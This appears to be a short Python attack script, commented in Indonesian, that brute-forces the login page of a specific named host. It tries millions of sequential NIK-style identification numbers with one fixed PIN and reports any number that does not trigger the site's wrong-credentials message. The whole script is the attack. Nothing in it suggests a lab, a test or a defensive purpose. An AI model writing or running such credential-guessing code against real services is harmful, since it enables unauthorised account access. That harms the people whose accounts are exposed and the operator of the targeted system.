import requests

url = 'https://homat0201.sat.co.id/login'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

for nik_first_two in range(1, 23):
    for nik_middle_two in range(1, 13):
        for nik_last_four in range(0, 10000):
            # Format nik dengan leading zeros
            nik = f'{nik_first_two:02d}{nik_middle_two:02d}{nik_last_four:04d}'

            # Buat payload untuk dikirimkan sebagai data POST
            payload = {'nik': nik, 'pin': '789789'}

            # Kirim POST request ke server
            response = requests.post(url, data=payload, headers=headers)

            if 'User/Pin Salah' not in response.text:
                print(f"Valid nik: {nik}")
                # Keluar dari loop jika nik valid ditemukan
                break
